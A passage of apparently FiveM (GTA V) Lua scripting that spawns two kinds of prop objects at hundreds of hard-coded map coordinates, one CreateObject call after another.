        CreateObject(4185368029, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
        Citizen.Wait(0)
        CreateObject(566160949, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
